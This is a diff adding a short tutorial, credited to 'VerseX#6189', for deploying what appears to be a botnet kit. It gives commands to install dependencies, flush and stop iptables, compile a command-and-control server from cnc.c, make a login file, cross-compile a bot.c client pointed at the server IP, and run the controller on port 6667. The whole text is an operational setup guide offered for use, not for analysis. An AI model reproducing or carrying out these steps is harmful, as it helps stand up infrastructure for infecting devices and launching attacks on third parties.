@@ -1,0 +1,41 @@
+╔═════════════════════════════╗
+║   Tutorial By VerseX#6189   ║
+╚═════════════════════════════╝
+
+╔═════════════════════════════╗
+║          Easy Setup         ║
+╚═════════════════════════════╝
+
+Setup Command > yum install gcc screen nano httpd python perl python-paramiko nano screen gcc bzip2 perl wget lbzip unzip httpd iptables-services -y; ulimit -n 999999; iptables -F; service iptables stop; echo "SSP TOP" > login.txt; gcc cnc.c -o SSP -pthread
+
+Edit Client Side (bot.c) with your server IP
+
+Compile Bot Command > python cc7.py bot.c SERVERIP
+
+Run Server Command > screen ./SSP 6667 850 420
+
+╔═════════════════════════════╗
+║         Normal Setup        ║
+╚═════════════════════════════╝
+
+Installing Dependencies
+yum install gcc screen nano httpd python perl python-paramiko nano screen gcc bzip2 perl wget lbzip unzip httpd iptables-services -y; ulimit -n 999999
+
+
+Stopping Iptables
+iptables -F; service iptables stop
+
+Edit Client Side (bot.c) with your server IP
+
+Compiling Serverside
+gcc cnc.c -o SSP -pthread
+
+Making Login Credentials
+echo "SSP TOP" > login.txt
+
+Cross Compiling
+python cc7.py bot.c SERVERIP
+
+
+Starting Serverside
+screen ./SSP 6667 850 1337
